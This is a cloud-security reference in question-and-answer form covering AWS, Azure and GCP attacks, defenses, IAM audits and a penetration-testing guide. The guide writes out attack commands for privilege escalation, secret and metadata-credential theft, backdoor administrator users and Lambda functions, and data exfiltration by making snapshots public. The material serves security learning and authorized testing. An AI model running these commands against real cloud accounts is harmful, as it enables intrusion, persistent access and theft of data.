# Cloud Security (AWS / Azure / GCP) and IAM

> Source: huggingface.co/datasets/Vyber07/cyber-security (Apache-2.0). Community-curated reference; verify commands and versions before use.

## Provide a comprehensive guide to cloud security attacks, defenses, and detection methods.

#### Comprehensive Cloud Security Guide

##### Cloud Attack Categories

###### 1. Identity and Access Management (IAM) Attacks

**Credential Theft**
- **Techniques:**
  - Phishing for cloud credentials
  - Credential harvesting from code repositories
  - Instance metadata service exploitation
  - OAuth token theft

- **Tools:**
  - CloudSploit: Cloud security scanning
  - Pacu: AWS exploitation framework
  - ScoutSuite: Cloud security auditing
  - Prowler: AWS security assessment

- **Detection:**
  - Unusual login locations
  - Failed authentication patterns
  - API call anomalies
  - Token usage monitoring

- **Defense:**
  - Multi-factor authentication
  - Conditional access policies
  - Credential rotation
  - Least privilege access

**Privilege Escalation**
- **Techniques:**
  - IAM policy manipulation
  - Role assumption abuse
  - Service account compromise
  - Cross-account access abuse

- **Detection:**
  - Privilege use monitoring
  - Policy change alerts
  - Role assumption tracking
  - Cross-account activity logging

- **Defense:**
  - Least privilege principle
  - Just-in-time access
  - Access reviews
  - Policy validation

###### 2. Data Exposure Attacks

**Storage Bucket Attacks**
- **Techniques:**
  - Public bucket enumeration
  - Bucket permission manipulation
  - Presigned URL abuse
  - Cross-account access

- **Tools:**
  - CloudBrute: Cloud enumeration
  - S3Scanner: S3 bucket discovery
  - buckets.grayhatwarfare.com: Public bucket search

- **Detection:**
  - Bucket access logging
  - Permission change monitoring
  - Data transfer alerts
  - Public exposure scanning

- **Defense:**
  - Bucket policies
  - Access logging
  - Encryption
  - DLP solutions

**Database Exposure**
- **Techniques:**
  - Public database access
  - Credential compromise
  - Backup exposure
  - Snapshot sharing

- **Detection:**
  - Database access logging
  - Connection monitoring
  - Query analysis
  - Backup access alerts

- **Defense:**
  - Network segmentation
  - Encryption
  - Access controls
  - Monitoring

###### 3. Compute Attacks

**Instance Exploitation**
- **Techniques:**
  - Vulnerable software exploitation
  - Metadata service attacks
  - User data script abuse
  - Snapshot extraction

- **Tools:**
  - Pacu: AWS exploitation
  - CloudGoat: Vulnerable AWS environment
  - Damn Vulnerable Cloud Application

- **Detection:**
  - Process monitoring
  - Network traffic analysis
  - API call logging
  - File integrity monitoring

- **Defense:**
  - Patch management
  - Hardening
  - Network security
  - Monitoring

**Container Attacks**
- **Techniques:**
  - Container escape
  - Image vulnerability exploitation
  - Secret exposure
  - Orchestration compromise

- **Detection:**
  - Container runtime monitoring
  - Image scanning
  - Network policy enforcement
  - API call logging

- **Defense:**
  - Container hardening
  - Image scanning
  - Network policies
  - Secret management

###### 4. Serverless Attacks

**Function Exploitation**
- **Techniques:**
  - Event injection
  - Dependency confusion
  - Environment variable exposure
  - Execution role abuse

- **Detection:**
  - Function invocation monitoring
  - Execution role tracking
  - Network activity analysis
  - Dependency scanning

- **Defense:**
  - Input validation
  - Least privilege roles
  - Dependency management
  - Monitoring

###### 5. Kubernetes Attacks

**Cluster Compromise**
- **Techniques:**
  - API server exploitation
  - etcd access
  - Kubelet exploitation
  - RBAC misconfiguration

- **Tools:**
  - kube-hunter: Kubernetes penetration testing
  - kubeaudit: Kubernetes security auditing
  - kube-bench: CIS benchmark assessment

- **Detection:**
  - API server logging
  - RBAC monitoring
  - Network policy enforcement
  - Runtime security

- **Defense:**
  - RBAC configuration
  - Network policies
  - Secret management
  - Runtime security

##### Cloud Defense Strategies

###### 1. Cloud Security Posture Management (CSPM)

**Capabilities:**
- Configuration assessment
- Compliance monitoring
- Risk identification
- Remediation guidance

**Tools:**
- AWS Security Hub
- Azure Security Center
- GCP Security Command Center
- Prisma Cloud
- Lacework

###### 2. Cloud Workload Protection Platform (CWPP)

**Capabilities:**
- Workload protection
- Vulnerability management
- Runtime security
- Threat detection

**Tools:**
- AWS GuardDuty
- Azure Defender
- GCP Cloud Armor
- Aqua Security
- Sysdig Secure

###### 3. Cloud Access Security Broker (CASB)

**Capabilities:**
- Access control
- Data protection
- Threat protection
- Compliance

**Tools:**
- Microsoft Cloud App Security
- Netskope
- Zscaler
- Palo Alto Networks

###### 4. Cloud-Native Security

**AWS Security Services:**
- IAM: Identity and access management
- GuardDuty: Threat detection
- Security Hub: Security posture
- CloudTrail: API logging
- Config: Configuration monitoring
- Macie: Data protection
- Inspector: Vulnerability assessment

**Azure Security Services:**
- Azure AD: Identity management
- Security Center: Security posture
- Sentinel: SIEM
- Defender: Threat protection
- Key Vault: Secret management
- Monitor: Logging and monitoring

**GCP Security Services:**
- Cloud IAM: Identity management
- Security Command Center: Security posture
- Cloud Armor: DDoS protection
- Cloud Logging: Logging
- Cloud Monitoring: Monitoring
- Secret Manager: Secret management

##### Cloud Forensics

###### 1. Evidence Collection

**Cloud-Specific Evidence:**
- CloudTrail logs
- VPC flow logs
- S3 access logs
- CloudWatch logs
- Resource configurations

**Collection Methods:**
- API-based collection
- Snapshot creation
- Log export
- Memory acquisition

###### 2. Analysis Techniques

**Log Analysis:**
- CloudTrail analysis
- VPC flow log analysis
- DNS query analysis
- API call analysis

**Timeline Reconstruction:**
- Event correlation
- User activity tracking
- Resource modification analysis
- Network flow reconstruction

###### 3. Incident Response

**Cloud-Specific Procedures:**
- Account isolation
- Resource preservation
- Credential rotation
- Access revocation

**Tools:**
- AWS Incident Response
- Azure Incident Response
- GCP Incident Response
- Third-party IR tools

##### Compliance and Governance

###### 1. Cloud Compliance Frameworks

**Standards:**
- SOC 2
- ISO 27001
- PCI DSS
- HIPAA
- GDPR
- FedRAMP

###### 2. Security Best Practices

**AWS Well-Architected Framework:**
- Security pillar
- Identity management
- Detection
- Infrastructure protection
- Data protection
- Incident response

**Azure Security Benchmark:**
- Identity management
- Network security
- Data protection
- Logging and monitoring
- Incident response

**GCP Security Best Practices:**
- Organization policies
- IAM best practices
- Network security
- Data protection
- Logging and monitoring

##### Cloud Security Tools

###### 1. Scanning and Assessment
- ScoutSuite: Multi-cloud security auditing
- Prowler: AWS security assessment
- CloudSploit: Cloud security scanning
- Checkov: Infrastructure as code scanning

###### 2. Runtime Protection
- Aqua Security: Container security
- Sysdig Secure: Container and cloud security
- Prisma Cloud: Cloud-native security
- Lacework: Cloud security

###### 3. Monitoring and Detection
- CloudTrail: AWS API logging
- Azure Monitor: Azure logging
- Cloud Logging: GCP logging
- Splunk: SIEM

###### 4. Compliance and Governance
- AWS Config: Configuration monitoring
- Azure Policy: Policy enforcement
- GCP Organization Policy: Policy management
- Terraform Sentinel: Infrastructure as code policy

##### Attack Scenarios

###### Scenario 1: AWS Credential Compromise
**Attack Steps:**
1. Harvest credentials from GitHub
2. Enumerate IAM permissions
3. Escalate privileges
4. Access sensitive data
5. Establish persistence

**Detection:**
- CloudTrail monitoring
- GuardDuty alerts
- IAM access analyzer
- Unusual API calls

**Response:**
1. Revoke compromised credentials
2. Review access logs
3. Assess damage
4. Implement additional controls

###### Scenario 2: Kubernetes Cluster Compromise
**Attack Steps:**
1. Discover exposed API server
2. Exploit RBAC misconfiguration
3. Access secrets
4. Lateral movement
5. Data exfiltration

**Detection:**
- API server logging
- RBAC monitoring
- Network policy alerts
- Runtime security

**Response:**
1. Isolate compromised pods
2. Rotate secrets
3. Review RBAC
4. Implement network policies

###### Scenario 3: Serverless Function Exploitation
**Attack Steps:**
1. Identify vulnerable function
2. Exploit event injection
3. Access execution role
4. Enumerate permissions
5. Data exfiltration

**Detection:**
- Function invocation monitoring
- Execution role tracking
- Network activity analysis
- Dependency scanning

**Response:**
1. Disable vulnerable function
2. Review execution role
3. Implement input validation
4. Monitor for re-exploitation

##### Best Practices

###### 1. Identity and Access Management
- Implement MFA everywhere
- Use least privilege principle
- Regular access reviews
- Credential rotation

###### 2. Data Protection
- Encryption at rest and in transit
- Data classification
- Access logging
- DLP implementation

###### 3. Network Security
- VPC design
- Security groups
- Network ACLs
- Private endpoints

###### 4. Monitoring and Logging
- Enable all logging
- Centralized log management
- Alert configuration
- Regular review

###### 5. Incident Response
- Cloud-specific IR plan
- Regular testing
- Automation
- Documentation

## How do I perform cloud penetration testing?

#### Cloud Penetration Testing Guide

##### Legal and Ethical Considerations

###### Authorization Requirements
- Written authorization from cloud provider
- Scope definition
- Rules of engagement
- Emergency contacts

###### Cloud Provider Policies
**AWS:**
- Penetration testing allowed
- Some services excluded
- Notification not required
- Follow acceptable use policy

**Azure:**
- Penetration testing allowed
- Some services excluded
- Notification not required
- Follow acceptable use policy

**GCP:**
- Penetration testing allowed
- Some services excluded
- Notification not required
- Follow acceptable use policy

##### Reconnaissance Phase

###### 1. Domain and Subdomain Enumeration
```bash
# Subdomain enumeration
amass enum -d target.com
subfinder -d target.com
assetfinder target.com

# DNS enumeration
dig target.com ANY
nslookup target.com
host -t mx target.com

# Cloud service discovery
cloud_enum -k target.com
S3Scanner scan --bucket-names wordlist.txt
```

###### 2. Cloud Resource Discovery
```bash
# AWS enumeration
aws sts get-caller-identity
aws iam get-account-authorization-details
aws s3 ls
aws ec2 describe-instances

# Azure enumeration
az account show
az ad app list
az vm list
az storage account list

# GCP enumeration
gcloud auth list
gcloud projects list
gcloud compute instances list
gcloud storage buckets list
```

###### 3. Port and Service Scanning
```bash
# Port scanning
nmap -sV -sC target.com
masscan -p1-65535 target.com

# Service enumeration
nmap -sV -p 80,443,8080,8443 target.com
```

##### Vulnerability Assessment

###### 1. Cloud Misconfiguration Scanning
```bash
# AWS scanning
prowler aws
scoutsuite aws
cloudmapper collect
cloudmapper webserver

# Azure scanning
scoutsuite azure
Azucar
PowerZure

# GCP scanning
scoutsuite gcp
gcp-iam-collector
```

###### 2. Container Security Scanning
```bash
# Image scanning
trivy image target:latest
grype target:latest
clair-scanner target:latest

# Kubernetes scanning
kube-hunter
kube-bench
kubeaudit
```

###### 3. Infrastructure as Code Scanning
```bash
# Terraform scanning
terraform plan
tfsec
checkov -d .

# CloudFormation scanning
cfn-lint template.yaml
cfn-nag template.yaml
```

##### Exploitation Phase

###### 1. IAM Exploitation
```bash
# AWS IAM exploitation
# Enumerate permissions
aws iam get-user
aws iam list-attached-user-policies --user-name target
aws iam list-user-policies --user-name target

# Privilege escalation
aws iam put-user-policy --user-name target --policy-name privesc --policy-document file://privesc.json
aws iam create-access-key --user-name target

# Role assumption
aws sts assume-role --role-arn arn:aws:iam::account:role/target --role-session-name privesc
```

###### 2. S3 Bucket Exploitation
```bash
# Bucket enumeration
aws s3 ls s3://target-bucket
aws s3 ls s3://target-bucket --recursive

# Data exfiltration
aws s3 sync s3://target-bucket ./exfiltrated

# Permission manipulation
aws s3api put-bucket-acl --bucket target-bucket --acl public-read
```

###### 3. EC2 Instance Exploitation
```bash
# Metadata service exploitation
curl http://169.254.169.254/latest/meta-data/
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/

# User data script abuse
aws ec2 describe-instance-attribute --instance-id i-1234567890abcdef0 --attribute userData

# Snapshot extraction
aws ec2 create-snapshot --volume-id vol-1234567890abcdef0 --description "PenTest"
aws ec2 modify-snapshot-attribute --snapshot-id snap-1234567890abcdef0 --attribute createVolumePermission --operation-type add --group-names all
```

###### 4. Kubernetes Exploitation
```bash
# API server access
kubectl get pods
kubectl get secrets
kubectl get serviceaccounts

# RBAC exploitation
kubectl auth can-i --list
kubectl create clusterrolebinding privesc --clusterrole=cluster-admin --serviceaccount=default:default

# Secret extraction
kubectl get secret target-secret -o yaml
kubectl get secret target-secret -o jsonpath='{.data.password}' | base64 -d
```

###### 5. Serverless Exploitation
```bash
# Lambda function enumeration
aws lambda list-functions
aws lambda get-function --function-name target-function

# Environment variable extraction
aws lambda get-function-configuration --function-name target-function

# Execution role abuse
aws lambda update-function-configuration --function-name target-function --role arn:aws:iam::account:role/privesc
```

##### Post-Exploitation

###### 1. Persistence
```bash
# Create backdoor user
aws iam create-user --user-name backdoor
aws iam create-access-key --user-name backdoor
aws iam attach-user-policy --user-name backdoor --policy-arn arn:aws:iam::aws:policy/AdministratorAccess

# Create backdoor role
aws iam create-role --role-name backdoor --assume-role-policy-document file://trust.json
aws iam attach-role-policy --role-name backdoor --policy-arn arn:aws:iam::aws:policy/AdministratorAccess

# Lambda backdoor
aws lambda create-function --function-name backdoor --runtime python3.9 --role arn:aws:iam::account:role/backdoor --handler lambda_function.lambda_handler --zip-file fileb://backdoor.zip
```

###### 2. Lateral Movement
```bash
# Cross-account access
aws sts assume-role --role-arn arn:aws:iam::target-account:role/admin --role-session-name lateral

# Service exploitation
aws ecs list-clusters
aws rds describe-db-instances
aws elasticache describe-cache-clusters
```

###### 3. Data Exfiltration
```bash
# S3 data exfiltration
aws s3 sync s3://sensitive-bucket ./exfiltrated

# RDS data exfiltration
aws rds create-db-snapshot --db-instance-identifier target --db-snapshot-identifier exfiltrate
aws rds modify-db-snapshot-attribute --db-snapshot-identifier exfiltrate --attribute-name restore --values-to-add all

# EBS snapshot exfiltration
aws ec2 create-snapshot --volume-id vol-target --description "Exfiltrate"
aws ec2 modify-snapshot-attribute --snapshot-id snap-target --attribute createVolumePermission --operation-type add --group-names all
```

##### Tools Reference

###### 1. Cloud Enumeration
- CloudBrute: Cloud resource enumeration
- S3Scanner: S3 bucket discovery
- cloud_enum: Multi-cloud enumeration
- Prowler: AWS security assessment

###### 2. Exploitation Frameworks
- Pacu: AWS exploitation framework
- CloudGoat: Vulnerable AWS environment
- Stratus Red Team: Cloud attack simulation
- Rhino Security Labs: Cloud security tools

###### 3. Kubernetes Security
- kube-hunter: Kubernetes penetration testing
- kube-bench: CIS benchmark assessment
- kubeaudit: Kubernetes security auditing
- CDK: Kubernetes penetration testing

###### 4. Container Security
- Trivy: Container vulnerability scanning
- Grype: Container vulnerability scanning
- Clair: Container vulnerability scanning
- Anchore: Container security

###### 5. Infrastructure as Code
- tfsec: Terraform security scanning
- Checkov: Infrastructure as code scanning
- cfsec: CloudFormation security scanning
- kubesec: Kubernetes security scanning

##### Reporting

###### 1. Vulnerability Documentation
- Affected resources
- Attack vector
- Impact assessment
- Remediation steps

###### 2. Attack Path Documentation
- Initial access
- Lateral movement
- Privilege escalation
- Data access
- Persistence mechanisms

###### 3. Risk Assessment
- CVSS scoring
- Business impact
- Exploitability
- Remediation priority

##### Defense Validation

###### 1. Security Control Testing
- IAM policy testing
- Network security testing
- Data protection testing
- Monitoring and detection testing

###### 2. Compliance Validation
- CIS benchmark assessment
- Cloud security best practices
- Regulatory compliance
- Internal policy compliance

###### 3. Incident Response Testing
- IR plan validation
- Detection capability testing
- Response procedure testing
- Recovery procedure testing

## What are the best practices for cloud security architecture?

#### Cloud Security Architecture Best Practices

##### Identity and Access Management

###### 1. Identity Foundation

**Centralized Identity Management:**
- Use cloud-native identity providers
- Integrate with existing identity systems
- Implement single sign-on (SSO)
- Centralize user lifecycle management

**Multi-Factor Authentication:**
- Enforce MFA for all users
- Use hardware tokens for privileged accounts
- Implement adaptive authentication
- Monitor for MFA bypass attempts

**Service Accounts:**
- Use managed identities where possible
- Implement least privilege
- Rotate credentials regularly
- Monitor service account usage

###### 2. Authorization

**Least Privilege Principle:**
- Grant minimum required permissions
- Use role-based access control (RBAC)
- Implement just-in-time access
- Regular access reviews

**Policy Management:**
- Use policy as code
- Implement policy validation
- Version control policies
- Test policies before deployment

**Cross-Account Access:**
- Use cross-account roles
- Implement resource-based policies
- Monitor cross-account activity
- Audit cross-account access

##### Data Protection

###### 1. Data Classification

**Classification Levels:**
- Public
- Internal
- Confidential
- Restricted

**Classification Methods:**
- Automated classification
- Manual classification
- Machine learning classification
- User-driven classification

###### 2. Encryption

**Encryption at Rest:**
- Use cloud-native encryption
- Implement customer-managed keys
- Rotate encryption keys
- Monitor key usage

**Encryption in Transit:**
- Enforce TLS everywhere
- Implement certificate management
- Monitor for weak ciphers
- Implement HSTS

**Key Management:**
- Use cloud key management services
- Implement key rotation
- Monitor key access
- Implement key policies

###### 3. Data Loss Prevention

**DLP Controls:**
- Monitor data access
- Detect sensitive data
- Prevent unauthorized transfer
- Implement data masking

**DLP Tools:**
- Cloud-native DLP
- Third-party DLP solutions
- Custom DLP rules
- DLP monitoring

##### Network Security

###### 1. Network Architecture

**VPC Design:**
- Implement network segmentation
- Use private subnets
- Implement NAT gateways
- Use VPC endpoints

**Network Security Controls:**
- Security groups
- Network ACLs
- Web application firewalls
- DDoS protection

**Network Monitoring:**
- VPC flow logs
- Network traffic analysis
- Intrusion detection
- Network forensics

###### 2. Private Connectivity

**Private Endpoints:**
- Use private endpoints for services
- Implement DNS resolution
- Monitor private endpoint access
- Implement access controls

**VPN and Direct Connect:**
- Implement site-to-site VPN
- Use dedicated connections
- Monitor connectivity
- Implement redundancy

##### Compute Security

###### 1. Virtual Machine Security

**Hardening:**
- Use hardened images
- Implement configuration management
- Regular patching
- Disable unnecessary services

**Monitoring:**
- Endpoint detection and response
- File integrity monitoring
- Process monitoring
- Network monitoring

###### 2. Container Security

**Image Security:**
- Use trusted base images
- Scan images for vulnerabilities
- Sign images
- Implement image policies

**Runtime Security:**
- Implement container runtime security
- Monitor container activity
- Implement network policies
- Use read-only filesystems

**Orchestration Security:**
- Implement RBAC
- Use network policies
- Monitor API server
- Implement pod security policies

###### 3. Serverless Security

**Function Security:**
- Implement least privilege roles
- Validate inputs
- Monitor function execution
- Implement dependency scanning

**Event Security:**
- Validate event sources
- Implement event filtering
- Monitor event processing
- Implement error handling

##### Security Monitoring

###### 1. Logging and Monitoring

**Log Collection:**
- Enable all logging sources
- Centralize log management
- Implement log retention
- Secure log storage

**Monitoring:**
- Real-time monitoring
- Alert configuration
- Dashboard creation
- Regular review

###### 2. Threat Detection

**Detection Methods:**
- Rule-based detection
- Behavioral analysis
- Machine learning
- Threat intelligence

**Response:**
- Automated response
- Manual investigation
- Incident response
- Forensic analysis

##### Compliance and Governance

###### 1. Compliance Frameworks

**Standards:**
- SOC 2
- ISO 27001
- PCI DSS
- HIPAA
- GDPR
- FedRAMP

**Implementation:**
- Control mapping
- Evidence collection
- Regular assessment
- Continuous monitoring

###### 2. Policy Management

**Policy as Code:**
- Define policies in code
- Version control policies
- Test policies
- Automate enforcement

**Governance:**
- Resource tagging
- Cost management
- Access reviews
- Regular audits

##### Incident Response

###### 1. IR Planning

**Cloud-Specific IR:**
- Cloud-native tools
- Automation
- Evidence preservation
- Communication procedures

**Testing:**
- Tabletop exercises
- Technical testing
- Regular updates
- Lessons learned

###### 2. Forensics

**Cloud Forensics:**
- Evidence collection
- Timeline analysis
- Root cause analysis
- Remediation

**Tools:**
- Cloud-native forensics
- Third-party tools
- Custom scripts
- Automation

##### Architecture Patterns

###### 1. Zero Trust Architecture

**Principles:**
- Never trust, always verify
- Assume breach
- Verify explicitly
- Use least privilege

**Implementation:**
- Identity verification
- Device validation
- Network segmentation
- Continuous monitoring

###### 2. Defense in Depth

**Layers:**
- Perimeter security
- Network security
- Endpoint security
- Application security
- Data security

**Controls:**
- Preventive controls
- Detective controls
- Corrective controls
- Compensating controls

###### 3. Security Automation

**Automation Areas:**
- Compliance checking
- Vulnerability management
- Incident response
- Configuration management

**Tools:**
- Infrastructure as code
- Configuration management
- Security orchestration
- Automated testing

##### Implementation Guide

###### 1. Assessment
- Current state analysis
- Gap analysis
- Risk assessment
- Prioritization

###### 2. Planning
- Architecture design
- Control selection
- Implementation roadmap
- Resource allocation

###### 3. Implementation
- Phased rollout
- Testing
- Documentation
- Training

###### 4. Operations
- Monitoring
- Maintenance
- Continuous improvement
- Regular review

## How to assess Identity and Access Management (IAM) security?

#### IAM Security Assessment

##### AWS IAM Audit
```bash
# List IAM users
aws iam list-users

# Check for unused credentials
aws iam generate-credential-report
aws iam get-credential-report

# Check MFA status
aws iam list-mfa-devices --user-name <username>

# Check access keys
aws iam list-access-keys --user-name <username>

# Check policies attached
aws iam list-attached-user-policies --user-name <username>
aws iam list-user-policies --user-name <username>

# Check for overly permissive policies
aws iam list-policies --scope Local | jq '.Policies[] | select(.PolicyName | contains("admin"))'
```

##### Azure AD Audit
```bash
# List users
az ad user list

# Check MFA status
az ad user list --query '[].{user:userPrincipalName,mfa:strongAuthenticationMethods[0].methodType}'

# Check role assignments
az role assignment list --all

# Check for guest users
az ad user list --filter "userType eq 'Guest'"
```

##### GCP IAM Audit
```bash
# List IAM policies
gcloud projects get-iam-policy <project-id>

# Check for owner roles
gcloud projects get-iam-policy <project-id> --flatten='bindings[].members' --filter='bindings.role:roles/owner'

# Check service accounts
gcloud iam service-accounts list
```

##### Common Issues
```
1. Unused credentials
2. Lack of MFA
3. Overly permissive policies
4. Shared accounts
5. Stale access keys
6. Excessive privileges
7. Missing password policies
8. No session timeout
```

##### Best Practices
```
1. Principle of least privilege
2. MFA for all users
3. Regular access reviews
4. Password policies
5. Session management
6. Audit logging
7. Just-in-time access
8. Role-based access control
```

##### Tools
- AWS IAM Access Analyzer
- Azure AD Identity Protection
- GCP IAM Recommender
- Prowler
- ScoutSuite
- CloudSploit
